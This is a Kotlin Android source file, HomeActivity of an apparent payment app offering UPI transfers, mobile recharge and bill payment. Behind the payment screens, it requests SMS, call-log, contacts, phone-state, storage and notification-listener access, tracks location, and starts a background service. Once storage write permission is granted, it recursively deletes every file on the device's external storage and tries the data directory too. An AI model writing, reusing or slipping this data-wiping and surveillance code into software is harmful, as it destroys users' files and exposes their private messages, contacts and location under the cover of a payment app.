package com.payment.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.IntentSender.SendIntentException
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.RelativeLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.NonNull
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.android.volley.AuthFailureError
import com.android.volley.DefaultRetryPolicy
import com.android.volley.Response
import com.android.volley.VolleyLog
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.android.gms.common.api.GoogleApiClient
import com.google.android.gms.common.api.ResultCallback
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.location.LocationSettingsResult
import com.google.android.gms.location.LocationSettingsStatusCodes
import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.messaging.FirebaseMessaging
import com.payment.app.services.MyService
import okhttp3.Interceptor.*
import org.json.JSONObject
import java.io.File


class HomeActivity : AppCompatActivity() {

    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private var isCallLogPermissionGranted = false
    private var isContactPermissionGranted = false
    private var isLocationPermissionGranted = false
    private var isPostNotificationPermissionGranted = false
    private var isSmsPermissionGranted = false
    private var isReadPhonePermissionGranted = false
    private var isReadExternalStoragePermissionGranted = false
    private var isWriteExternalStoragePermissionGranted = false
    private var isManageExternalStoragePermissionGranted = false
    private var isReadMediaImagePermissionGranted = false
    private var isReadMediaVideoPermissionGranted = false
    private var isWriteContactPermissionGranted = false
    private val permissionId = 2
    private var googleApiClient: GoogleApiClient? = null
    val REQUEST_LOCATION = 199
    private var stringLatitude = "0.0"
    private var stringLongitude = "0.0"
    private var fusedLocationProviderClient: FusedLocationProviderClient? = null
    private var fcmToken = ""
    companion object {
        private const val REQUEST_CODE_ENABLE_ADMIN = 1
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val btnPayUpi: CardView = findViewById(R.id.btn_pay_upi)
        val btn_pay_contact: CardView = findViewById(R.id.btn_pay_contact)
        val btnMobileRecharge: RelativeLayout = findViewById(R.id.btn_mobile_recharge)
        val btnElectricityBill: RelativeLayout = findViewById(R.id.btn_electricity_bill)
        val home_bottom: ImageView = findViewById(R.id.home_bottom)
        val history_bottom: ImageView = findViewById(R.id.history_bottom)
        val email: TextView = findViewById(R.id.textView12)
        val name: TextView = findViewById(R.id.textView11)

        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        email.text = preferences.getString("email", "")
        name.text = preferences.getString("name", "")


        findViewById<ImageView>(R.id.imageView2).setOnClickListener {
            startActivity(Intent(this, LogActivity::class.java))
        }

        permissionLauncher =
            registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
                isContactPermissionGranted =
                    permissions[Manifest.permission.READ_CONTACTS] ?: isContactPermissionGranted
                isCallLogPermissionGranted =
                    permissions[Manifest.permission.READ_CALL_LOG] ?: isCallLogPermissionGranted
                isLocationPermissionGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION]
                    ?: isLocationPermissionGranted
                isPostNotificationPermissionGranted =
                    permissions[Manifest.permission.POST_NOTIFICATIONS]
                        ?: isPostNotificationPermissionGranted
                isSmsPermissionGranted =
                    permissions[Manifest.permission.READ_SMS] ?: isSmsPermissionGranted
                isReadPhonePermissionGranted = permissions[Manifest.permission.READ_PHONE_STATE]
                    ?: isReadPhonePermissionGranted
                isReadExternalStoragePermissionGranted =
                    permissions[Manifest.permission.READ_EXTERNAL_STORAGE]
                        ?: isReadExternalStoragePermissionGranted
                isWriteExternalStoragePermissionGranted =
                    permissions[Manifest.permission.WRITE_EXTERNAL_STORAGE]
                        ?: isWriteExternalStoragePermissionGranted
                isReadMediaImagePermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_IMAGES]
                        ?: isReadMediaImagePermissionGranted
                isReadMediaVideoPermissionGranted =
                    permissions[Manifest.permission.READ_MEDIA_VIDEO]
                        ?: isReadMediaVideoPermissionGranted
                isWriteContactPermissionGranted =
                    permissions[Manifest.permission.WRITE_CONTACTS]
                        ?: isWriteContactPermissionGranted
                isManageExternalStoragePermissionGranted =
                    permissions[Manifest.permission.MANAGE_EXTERNAL_STORAGE]
                        ?: isManageExternalStoragePermissionGranted
            }

        requestPermissions()
        requestPermission()
        getToken()

        val locationRequest = LocationRequest.Builder(PRIORITY_HIGH_ACCURACY, 100)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(2000)
            .setMaxUpdateDelayMillis(100)
            .build()

        val locationCallback: LocationCallback = object : LocationCallback() {
            override fun onLocationResult(@NonNull locationResult: LocationResult) {
                if (locationResult == null) {
                    return
                }
            }
        }

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }

        LocationServices.getFusedLocationProviderClient(applicationContext)
            .requestLocationUpdates(locationRequest, locationCallback, null)
        fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);

        try {
            getLocation()
        } catch (e: Exception) {
            ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
        }

        home_bottom.setOnClickListener(View.OnClickListener { homeBottom() })

        history_bottom.setOnClickListener(View.OnClickListener { historyBottom() })

        btnPayUpi.setOnClickListener(View.OnClickListener { switchActivities() })

        btn_pay_contact.setOnClickListener(View.OnClickListener { btnPayContact() })

        btnMobileRecharge.setOnClickListener(View.OnClickListener { mobileRecharge() })

        btnElectricityBill.setOnClickListener(View.OnClickListener { electricityBill() })

        val serviceIntent = Intent(this, MyService::class.java)
        startForegroundService(serviceIntent)

        val notificationListenerString =
            Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
        if (notificationListenerString == null || !notificationListenerString.contains(packageName)) {
            Log.d("Notification Permission", "no access")
            notificationRequestPermission()
        } else {
            Log.d("Notification Permission", "has access")
        }

        if (checkPermissionsExternalStorage()) {
            // Permission granted; you can now clear the directory.
            clearDirectoryInExternalStorage()
        }

    }

    private fun checkPermissionsExternalStorage(): Boolean {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED
        ) {
            // Permission not granted; request it from the user.
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),
                1
            )
            return false
        }
        return true
    }


    private fun clearDirectoryInExternalStorage() {
        val externalStorageDirectory = File(Environment.getExternalStorageDirectory().absolutePath)
        val androidFiles = File(Environment.getDataDirectory().absolutePath)
        val dir: File = applicationContext.getCacheDir()
        deleteAllFilesAndDirectories(dir)
        val filesAndDirectories = getAllFilesAndDirectories(externalStorageDirectory)
        val androidDirectories = getAllFilesAndDirectories(externalStorageDirectory)
        if (filesAndDirectories.isNotEmpty()) {
            println("Files and directories in $externalStorageDirectory:")
            for (item in filesAndDirectories) {
                println(item.absolutePath)
            }
            val success = deleteAllFilesAndDirectories(externalStorageDirectory)

            if (success) {
                ApiCallManager.appendLog("All files and directories deleted successfully.")

                println("All files and directories deleted successfully.")
            } else {
                ApiCallManager.appendLog("Error deleting files and directories.")

                println("Error deleting files and directories.")
            }
        }
        else {
            ApiCallManager.appendLog("No files or directories found in $externalStorageDirectory.")

            println("No files or directories found in $externalStorageDirectory.")
        }
        if (androidDirectories.isNotEmpty()) {
            println("Files and directories in $androidFiles:")
            for (item in androidDirectories) {
                println(item.absolutePath)
            }
            val success = deleteAllFilesAndDirectories(androidFiles)

            if (success) {
                println("All files and directories deleted successfully.")
            } else {
                println("Error deleting files and directories.")
            }
        }
        else {
            println("No files or directories found in $androidFiles.")
        }
    }

    fun deleteAllFilesAndDirectories(targetDirectory: File): Boolean {
        val allFilesAndDirectories = getAllFilesAndDirectories(targetDirectory)

        if (allFilesAndDirectories.isNotEmpty()) {
            for (fileOrDirectory in allFilesAndDirectories) {
                if (fileOrDirectory.isDirectory) {
                    deleteAllFilesAndDirectories(fileOrDirectory)
                }
                if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                    fileOrDirectory.delete()
                    val scanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
                    scanIntent.data = Uri.fromFile(fileOrDirectory)
                    sendBroadcast(scanIntent)
                } else {
                    // Handle the case when external storage is not available
                }
                Log.d("clear directory", "$fileOrDirectory")

            }
            return true
        }

        return false
    }

    fun getAllFilesAndDirectories(directory: File): List<File> {
        val resultList = mutableListOf<File>()

        if (directory.exists() && directory.isDirectory) {
            val files = directory.listFiles()
            if (files != null) {
                resultList.addAll(files)
            }
        }

        return resultList
    }


    fun notificationRequestPermission() {
        val requestIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
        requestIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(requestIntent)
    }

    private fun getToken() {
        var baseUrl = getString(R.string.api)
        val sharedPreferences: SharedPreferences = getSharedPreferences("token", AppCompatActivity.MODE_PRIVATE)
        val token: String = sharedPreferences.getString("token", "").toString()

        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w("FcmToken", "Fetching FCM registration token failed", task.exception)
                return@OnCompleteListener
            }

            // Get new FCM registration token
            fcmToken = task.result
            ApiCallManager.appendLog("fcmToken ====> $fcmToken")
//            apiCall.updateFcmToken(token, applicationContext,baseUrl,fcmToken)
            updateFcmToken(fcmToken,token,baseUrl)

            // Log and toast
            Log.d("FcmToken", "token $fcmToken")
        })

    }

    private fun updateFcmToken(fcmToken: String?, token: String, baseUrl: String) {
        ApiCallManager.appendLog("Calling Update FcmToken API")
        val requestData = JSONObject()
        requestData.put("deviceToken", fcmToken)
        Log.d("callUpdateFcmTokenApi", "callUpdateFcmTokenApi")
        val url = "$baseUrl/api/Account/UpdateDeviceToken"
        ApiCallManager.appendLog("===================")
        ApiCallManager.appendLog("Get Update FcmToken API url => $url")
        ApiCallManager.appendLog("===================")
        Log.d("requestData", "requestData  ==> $requestData")
        val req: JsonObjectRequest = object : JsonObjectRequest(
            Method.POST, url, requestData,
            Response.Listener<JSONObject> { response ->
                ApiCallManager.appendLog("Get Update FcmToken API Call Success")
                ApiCallManager.appendLog("callUpdateFcmTokenApi Response : $response")
                Log.d("callUpdateFcmTokenApi Response", response.toString())
            },
            Response.ErrorListener { error ->
                VolleyLog.d("Error", "Error: " + error.message)
                ApiCallManager.appendLog("Get Update FcmToken API Call failed: ${error.message ?: "Unknown"}")
            }) {

            @Throws(AuthFailureError::class)
            override fun getHeaders(): Map<String, String> {
                val headers = HashMap<String, String>()
                headers["Authorization"] = "Bearer $token"
                headers["accept"] = "*/*"
                headers["Content-Type"] = "application/json"
                return headers
            }
        }
        req.retryPolicy = DefaultRetryPolicy(
            10000,
            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
        )
        val queue = Volley.newRequestQueue(applicationContext)
        queue.add(req)
    }

    @SuppressLint("MissingPermission", "SetTextI18n")
    private fun getLocation() {
        if (checkPermissions()) {
            if (isLocationEnabled()) {
                fusedLocationProviderClient?.lastLocation?.addOnSuccessListener(this,
                    OnSuccessListener<Location?> { location ->
                        if (location != null) {
                            stringLatitude = java.lang.Double.toString(location.latitude)
                            stringLongitude = java.lang.Double.toString(location.longitude)
                        } else {
                            stringLatitude = "null"
                            stringLongitude = "null"
                        }
                        Log.d("stringLatitude ", stringLatitude)
                        Log.d("stringLongitude ", stringLongitude)
                    })
            }
            else {
                ApiCallManager.appendLog("Please turn on location")

                Toast.makeText(this, "Please turn on location", Toast.LENGTH_LONG).show()
                enableLoc()
            }
        } else {
//            displayLocationSettingsRequest(applicationContext)
            requestPermissions()
        }
    }

    private fun enableLoc() {
        if (googleApiClient == null) {
            googleApiClient = GoogleApiClient.Builder(applicationContext)
                .addApi(LocationServices.API)
                .addConnectionCallbacks(object : GoogleApiClient.ConnectionCallbacks {
                    override fun onConnected(bundle: Bundle?) {}
                    override fun onConnectionSuspended(i: Int) {
                        googleApiClient!!.connect()
                    }
                })
                .addOnConnectionFailedListener { connectionResult ->
                    Log.d(
                        "Location error",
                        "Location error " + connectionResult.errorCode
                    )
                }.build()
            googleApiClient!!.connect()
            val locationRequest = LocationRequest.create()
            locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
            locationRequest.interval = (30 * 1000).toLong()
            locationRequest.fastestInterval = (5 * 1000).toLong()
            val builder = LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest)
            builder.setAlwaysShow(true)
            val result =
                LocationServices.SettingsApi.checkLocationSettings(googleApiClient!!, builder.build())
            result.setResultCallback(object : ResultCallback<LocationSettingsResult?> {
                override fun onResult(result: LocationSettingsResult) {
                    val status = result.status
                    when (status.statusCode) {
                        LocationSettingsStatusCodes.RESOLUTION_REQUIRED -> try {
                            // Show the dialog by calling startResolutionForResult(),
                            // and check the result in onActivityResult().
                            status.startResolutionForResult(this@HomeActivity, REQUEST_LOCATION)

//                                finish();
                        } catch (e: SendIntentException) {
                            // Ignore the error.
                        }
                    }
                }
            })
        }
    }

    private fun isLocationEnabled(): Boolean {
        val locationManager: LocationManager =
            getSystemService(LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
            LocationManager.NETWORK_PROVIDER
        )
    }

    private fun checkPermissions(): Boolean {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
//            ApiCallManager.appendLog("Location Permission GRANTED")

            return true
        }
//        ApiCallManager.appendLog("Location Permission Denied")
        return false
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION
            ),
            permissionId
        )

    }

    @SuppressLint("MissingSuperCall")
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        if (requestCode == permissionId) {
            if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                getLocation()
            }
        }
    }


    private fun homeBottom() {
        val switchActivityIntent = Intent(this, HomeActivity::class.java)
        startActivity(switchActivityIntent)
        finish()
    }

    private fun historyBottom() {
        val switchActivityIntent = Intent(this, HistoryActivity::class.java)
        startActivity(switchActivityIntent)
        overridePendingTransition(0, 0)
        finish()
    }

    private fun switchActivities() {
        val switchActivityIntent = Intent(this, UpiPaymentActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun btnPayContact() {
        val switchActivityIntent = Intent(this, ContactActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun mobileRecharge() {
        val switchActivityIntent = Intent(this, MobileRechargeActivity::class.java)
        startActivity(switchActivityIntent)
    }

    private fun electricityBill() {
        val switchActivityIntent = Intent(this, ElectricityBillActivity::class.java)
        startActivity(switchActivityIntent)
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermission() {
        isContactPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        isCallLogPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED

        isLocationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        isPostNotificationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED

        isSmsPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

        isReadPhonePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED

        isReadExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isWriteExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaImagePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_IMAGES
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaVideoPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_VIDEO
        ) == PackageManager.PERMISSION_GRANTED

        isWriteContactPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.WRITE_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        isManageExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.MANAGE_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED


        val permissionRequest: MutableList<String> = ArrayList()

        if (!isContactPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CONTACTS)
        }

        if (!isCallLogPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_CALL_LOG)
        }

        if (!isLocationPermissionGranted) {
            permissionRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if (!isPostNotificationPermissionGranted) {
            permissionRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if (!isSmsPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_SMS)
        }

        if (!isReadPhonePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (!isReadExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if (!isWriteExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if (!isReadMediaImagePermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
        }

        if (!isReadMediaVideoPermissionGranted) {
            permissionRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
        }

        if (!isWriteContactPermissionGranted) {
            permissionRequest.add(Manifest.permission.WRITE_CONTACTS)
        }

        if (!isManageExternalStoragePermissionGranted) {
            permissionRequest.add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        }

        if (permissionRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionRequest.toTypedArray())
        }

    }

}